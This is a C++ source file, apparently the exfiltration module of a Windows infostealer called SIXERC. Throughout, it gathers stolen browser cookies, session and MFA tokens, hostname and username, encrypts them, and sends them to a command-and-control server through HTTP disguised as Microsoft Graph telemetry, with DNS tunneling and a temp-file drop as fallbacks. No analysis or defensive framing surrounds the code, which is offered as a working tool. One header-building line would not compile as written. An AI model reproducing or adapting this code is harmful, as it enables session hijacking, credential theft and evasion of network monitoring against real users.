// ============================================================================
// SIXERC — EP Implementation
// ============================================================================

#include "modules/ep.hpp"
#include "core/crypto.hpp"
#include "core/utils.hpp"
#include "core/obfuscation.hpp"
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <windows.h>
#include <windns.h>

namespace sixerc::ep {

using json = nlohmann::json;

std::string build_payload(const std::vector<HarvestedSession>& sessions,
                          const std::vector<ServiceData>& services) {
    json payload;
    payload["version"] = SIXERC_VERSION;
    payload["author"] = SIXERC_AUTHOR;
    payload["codename"] = SIXERC_CODENAME;
    payload["timestamp"] = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    payload["hostname"] = []() {
        char buf[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameA(buf, &size);
        return std::string(buf);
    }();
    payload["username"] = []() {
        char buf[256];
        DWORD size = 256;
        GetUserNameA(buf, &size);
        return std::string(buf);
    }();
    
    json sessions_arr = json::array();
    for (const auto& session : sessions) {
        json s;
        s["browser"] = session.browser_fingerprint;
        s["user_agent"] = session.user_agent;
        s["harvested_at"] = std::chrono::duration_cast<std::chrono::seconds>(
            session.harvested_at.time_since_epoch()).count();
        
        json cookies = json::array();
        for (const auto& cookie : session.cookies) {
            json c;
            c["name"] = cookie.name;
            c["value"] = cookie.value;
            c["domain"] = cookie.domain;
            c["path"] = cookie.path;
            c["expires"] = cookie.expires_utc;
            c["secure"] = cookie.is_secure;
            c["httponly"] = cookie.is_httponly;
            c["persistent"] = cookie.is_persistent;
            cookies.push_back(c);
        }
        s["cookies"] = cookies;
        
        json tokens = json::array();
        for (const auto& token : session.tokens) {
            json t;
            t["type"] = token.token_type;
            t["value"] = token.value;
            t["domain"] = token.domain;
            t["valid"] = token.is_valid;
            t["mfa"] = token.mfa_claimed;
            tokens.push_back(t);
        }
        s["tokens"] = tokens;
        sessions_arr.push_back(s);
    }
    payload["sessions"] = sessions_arr;
    
    json services_arr = json::array();
    for (const auto& svc : services) {
        json s;
        s["service"] = static_cast<int>(svc.service);
        s["endpoint"] = svc.endpoint;
        s["access_granted"] = svc.access_granted;
        s["response_preview"] = svc.raw_response.substr(0, 4096);
        services_arr.push_back(s);
    }
    payload["services"] = services_arr;
    
    return payload.dump();
}

std::vector<byte> encrypt_payload(const std::string& payload, const std::string& rsa_pubkey) {
    // Generate random AES key and IV
    bytes aes_key = crypto::generate_random_bytes(32);
    bytes iv = crypto::generate_random_bytes(12);
    bytes tag;
    
    // Encrypt payload with AES-256-GCM
    bytes ciphertext = crypto::aes_gcm_encrypt(
        bytes(payload.begin(), payload.end()), aes_key, iv, tag);
    
    if (ciphertext.empty()) return {};
    
    // Encrypt AES key with RSA-2048
    bytes encrypted_key = crypto::rsa_encrypt(aes_key, rsa_pubkey);
    if (encrypted_key.empty()) return {};
    
    // Build final envelope: [enc_key_len(4)][enc_key][iv(12)][tag(16)][ciphertext]
    std::vector<byte> envelope;
    uint32_t key_len = static_cast<uint32_t>(encrypted_key.size());
    envelope.insert(envelope.end(), reinterpret_cast<byte*>(&key_len),
                    reinterpret_cast<byte*>(&key_len) + 4);
    envelope.insert(envelope.end(), encrypted_key.begin(), encrypted_key.end());
    envelope.insert(envelope.end(), iv.begin(), iv.end());
    envelope.insert(envelope.end(), tag.begin(), tag.end());
    envelope.insert(envelope.end(), ciphertext.begin(), ciphertext.end());
    
    // Wipe sensitive material
    crypto::secure_zero(aes_key.data(), aes_key.size());
    
    return envelope;
}

static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}

bool exfil_http(const std::vector<byte>& encrypted_data, const C2Config& config) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    std::string b64_data = crypto::base64_encode(encrypted_data);
    
    // Mimic Microsoft Graph API telemetry
    json telemetry;
    telemetry["eventType"] = "msGraphClientTelemetry";
    telemetry["sessionId"] = crypto::base64_encode(crypto::generate_random_bytes(16));
    telemetry["payload"] = b64_data;
    telemetry["clientVersion"] = "1.0.0";
    telemetry["sdkVersion"] = "graph-java/5.77.0";
    
    std::string post_data = telemetry.dump();
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                         "AppleWebKit/537.36 (KHTML, like Gecko) "
                                         "Chrome/120.0.0.0 Safari/537.36");
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "x-ms-client-request-id: " + 
        crypto::base64_encode(crypto::generate_random_bytes(12)));
    
    curl_easy_setopt(curl, CURLOPT_URL, config.primary_endpoint.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}

bool exfil_dns(const std::vector<byte>& encrypted_data, const C2Config& config) {
    if (config.fallback_endpoint.empty()) return false;
    
    // Chunk data into DNS-friendly sizes (max 63 chars per label, 255 total)
    std::string b64_data = crypto::base64_encode(encrypted_data);
    
    const size_t chunk_size = 50; // Conservative
    size_t num_chunks = (b64_data.size() + chunk_size - 1) / chunk_size;
    
    for (size_t i = 0; i < num_chunks; ++i) {
        std::string chunk = b64_data.substr(i * chunk_size, chunk_size);
        std::string query = chunk + "." + config.fallback_endpoint;
        
        // Perform DNS query (A record)
        DNS_STATUS status;
        PDNS_RECORD results = nullptr;
        status = DnsQuery_A(query.c_str(), DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, nullptr, &results, nullptr);
        
        if (results) DnsRecordListFree(results, DnsFreeRecordList);
        
        obf::stealth_sleep(1000);
    }
    
    return true;
}

bool exfil_file_drop(const std::vector<byte>& encrypted_data, const C2Config& config) {
    std::wstring drop_path = utils::get_temp_path() + L"\\" +
        utils::utf8_to_wstring(crypto::base64_encode(crypto::generate_random_bytes(12))) + L".tmp";
    
    std::ofstream file(drop_path, std::ios::binary);
    if (!file.is_open()) return false;
    
    file.write(reinterpret_cast<const char*>(encrypted_data.data()), encrypted_data.size());
    file.close();
    
    // Also try network shares if available
    // (simplified — can be expanded)
    
    return true;
}

bool exfiltrate(const std::vector<HarvestedSession>& sessions,
                const std::vector<ServiceData>& services,
                const C2Config& config) {
    std::string payload = build_payload(sessions, services);
    std::vector<byte> encrypted = encrypt_payload(payload, config.rsa_public_key_pem);
    
    if (encrypted.empty()) return false;
    
    // Try primary method first
    if (exfil_http(encrypted, config)) {
        return true;
    }
    
    // Fallback to DNS tunneling
    if (config.use_dns_tunnel && exfil_dns(encrypted, config)) {
        return true;
    }
    
    // Final fallback to file drop
    if (config.use_file_drop && exfil_file_drop(encrypted, config)) {
        return true;
    }
    
    return false;
}

} // namespace sixerc::ep
